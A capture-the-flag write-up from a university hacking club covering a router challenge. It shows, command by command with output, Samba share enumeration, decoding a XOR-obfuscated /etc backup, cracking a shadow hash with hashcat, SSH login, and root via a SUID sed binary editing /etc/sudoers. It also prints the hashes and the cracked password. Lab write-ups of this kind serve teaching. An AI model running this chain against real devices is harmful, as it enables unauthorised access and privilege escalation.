---
layout: ctf_overview
title: Pwn2own CTF (Hacking Club, IIITH)
category: Pwn2own-CTF
date: 2024-02-11
---

# Writeup for Router challenge

1. Find the gateway for the router. This can be done by executing `ip a`:
    ```text
    2: wlan0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether c0:b8:83:58:de:a0 brd ff:ff:ff:ff:ff:ff
    inet 192.168.3.231/24 brd 192.168.3.255 scope global dynamic noprefixroute wlan0
       valid_lft 43158sec preferred_lft 43158sec
    inet6 fd7f:9138:f698::4cc/128 scope global dynamic noprefixroute 
       valid_lft 43158sec preferred_lft 43158sec
    inet6 fd7f:9138:f698:0:1bae:f399:1d82:be49/64 scope global noprefixroute 
       valid_lft forever preferred_lft forever
    inet6 fe80::93f0:acf3:4a79:4dac/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
    ```
    From here we can figure out that the gateway is `192.168.3.1`.
2. Now run `nmap -vvvv 192.168.3.1` to find out the services available:
    ```text
    Starting Nmap 7.94 ( https://nmap.org ) at 2024-02-11 13:12 IST
    Initiating Ping Scan at 13:12
    Scanning 192.168.3.1 [2 ports]
    Completed Ping Scan at 13:12, 0.00s elapsed (1  total hosts)
    Initiating Parallel DNS resolution of 1 host. at    13:12
    Completed Parallel DNS resolution of 1 host. at     13:12, 0.00s elapsed
    DNS resolution of 1 IPs took 0.00s. Mode: Async     [#: 1, OK: 1, NX: 0, DR: 0, SF: 0, TR: 1, CN: 0]
    Initiating Connect Scan at 13:12
    Scanning OpenWrt.lan (192.168.3.1) [1000 ports]
    Discovered open port 139/tcp on 192.168.3.1
    Discovered open port 22/tcp on 192.168.3.1
    Discovered open port 445/tcp on 192.168.3.1
    Discovered open port 80/tcp on 192.168.3.1
    Discovered open port 53/tcp on 192.168.3.1
    ```
    Here we can see that some samba ports are open, so let's try connecting via a samba client.
3. Run `smbclient -L openwrt.lan -U%` to find the shares in the samba server.
    ```text
    Sharename       Type      Comment
	---------       ----      -------
	Backups         Disk      
	IPC$            IPC       IPC Service (Samba on OpenWRT)
    ```
    Here we can see that there is a share named `Backups` which is interesting.
4. Now let's get into the samba shell using `smbclient //openwrt.lan/Backups -U root`. The password is empty. Now we can list the directories and download all the files.
    ```text
    Try "help" to get a list of possible commands.
    smb: \> dir
      .                                   D         0  Sun Feb 11 10:22:42 2024
      ..                                  D         0  Sun Feb 11 04:25:43 2024
      etc.tar.gz                          N     201256  Sun Feb 11 09:56:40 2024
      hey.txt                             N         114  Sun Feb 11 10:22:42 2024

    		19608 blocks of size 1024. 15580 blocks     available
    smb: \> get etc.tar.gz
    getting file \etc.tar.gz of size 201256 as etc. tar.gz (901.6 KiloBytes/sec) (average 901.6  KiloBytes/sec)
    smb: \> get hey.txt
    getting file \hey.txt of size 114 as hey.txt (1.    7 KiloBytes/sec) (average 692.4 KiloBytes/sec)
    smb: \> exit
    ```
5. Let's check out `hey.txt`:
    ```text
    Hey, make sure to keep the backups safe from everyone. We dont want anyone 
    to be able to read it!! Keep it safe!
    ```
    So it looks like the next stage is with `etc.tar.gz`.
6. But `tar xzf` doesn't work with the file since the file is corrupted:
    ```shell
    $ file etc.tar.gz
    etc.tar.gz: data
    ```
7. Let's find out what's going on with file using `xxd`:
    ```shell
    $ xxd etc.tar.gz | head                          Sunday 11 February 2024 01:27:07 PM
    00000000: 9f0b 8880 8080 8080 8083 6cdd fbf3    5bb6  ..........l...[.
    00000010: 366f 3f52 2740 a81d f53b a3ca fccb    4e0e  6o?R'@...;....N.
    00000020: e72e 1bba 2de7 12b4 b7ce 1b59 4df6    b890  ....-......YM...
    00000030: 89c9 2879 8a9f 261c ed3f 7bbd 809f    62db  ..(y..&..?{...b.
    00000040: 14e3 3bf7 f74d 44a2 f980 7c80 9e1c    f3f0  ..;..MD...|.....
    00000050: f088 12a4 b267 dfbd 70a6 4236 50b4    3e07  .....g..p.B6P.>.
    00000060: 2d3e 6747 122a 6952 e231 1097 c017    c4c5  ->gG.*iR.1......
    00000070: ddfc 0534 07ee 985b 62b0 4281 c2df    851e  ...4...[b.B.....
    00000080: 9775 65bb 147e ef3a 9168 7f77 7ff8    58ba  .ue..~.:.h.w..X.
    00000090: f87f af96 077a dfd6 7505 8add 8f7d afad  .....z..u....}..
    ```
8. Looks like the bytes are XOR'd with `0x80`, so let's XOR it with `0x80` to restore it:
    ```py
    with open('stage2.tar.gz', 'wb') as output:
        with open('etc.tar.gz', 'rb') as input:
            output.write(bytes([i ^ 0x80 for i in input.read()]))
    ```
9. Now `tar xzf stage2.tar.gz` will give a `etc` directory.
10. Let's check out `/etc/shadow`:
    ```text
    root:$1$PmDIQj10$LjYSCsBONVnZArWfDMpGL/:19675:0:99999:7:::
    daemon:*:0:0:99999:7:::
    ftp:*:0:0:99999:7:::
    network:*:0:0:99999:7:::
    nobody:*:0:0:99999:7:::
    ntp:x:0:0:99999:7:::
    dnsmasq:x:0:0:99999:7:::
    logd:x:0:0:99999:7:::
    ubus:x:0:0:99999:7:::
    allen:$1$okn32I0G$O0cA/T7JTiQ.I8im2lxgr0:19763:0:99999:7:::
    sshd:x:0:0:99999:7:::
    ```
11. Now cracking the password of the `allen` user using `hashcat`:
    ```shell
    $ hashcat -a 0 -m 500 '$1$okn32I0G$O0cA/T7JTiQ.I8im2lxgr0' ~/rockyou.txt
    ```
12. The password is `allen070306`:
    ```text
    $1$okn32I0G$O0cA/T7JTiQ.I8im2lxgr0:allen070306            

    Session..........: hashcat
    Status...........: Cracked
    Hash.Mode........: 500 (md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5))
    Hash.Target......: $1$okn32I0G$O0cA/T7JTiQ.I8im2lxgr0
    ```
13. Now we can `ssh` into the router as the `allen` user:
    ```shell
    $ ssh allen@openwrt.lan
    ```
14. Now let's try to find some privilege escalation vectors using `linpeas`. SCP the `linpeas.sh` script to the router and execute it.
    ```shell
    $ wget https://github.com/carlospolop/PEASS-ng/releases/download/20240211-db8c669a/linpeas.sh
    $ scp linpeas.sh allen@openwrt.lan:/tmp/linpeas.sh
    ```
15. From the output of linpeas we can find this interesting bit:
    ```shell
                          ╔════════════════════════════════════╗
    ══════════════════════╣ Files with Interesting Permissions ╠══════════════════════
                          ╚════════════════════════════════════╝
    ╔══════════╣ SUID - Check easy privesc, exploits and write perms
    ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
    strace Not Found
    -rwsr-xr-x    1 root     root      196.0K Sep 20 00:08 /overlay/upper/usr/bin/sudo  --->    check_if_the_sudo_version_is_vulnerable
    -rwsr-xr-x    1 root     root      128.3K Feb 28  2023 /overlay/upper/usr/libexec/sed-gnu (Unknown SUID     binary!)
    -rwsr-xr-x    1 root     root      196.0K Sep 20 00:08 /usr/bin/sudo  --->      check_if_the_sudo_version_is_vulnerable
    -rwsr-xr-x    1 root     root      128.3K Feb 28  2023 /usr/libexec/sed-gnu (Unknown SUID binary!)
    ```
16. You can find the odd `/usr/libexec/sed-gnu` binary with the SUID bit set. So we can execute sed with root privileges.
17. Let's run the binary to modify the `/etc/sudoers` file to give sudo access to our `allen` user:
    ```shell
    $ /usr/libexec/sed-gnu -ibak "s/### allen ALL=(ALL:ALL) NOPASSWD: ALL/allen ALL=(ALL:ALL) NOPASSWD: ALL/" /etc/sudoers
    ```
18. Now we have root access to the router via `sudo`. Challenge solved!
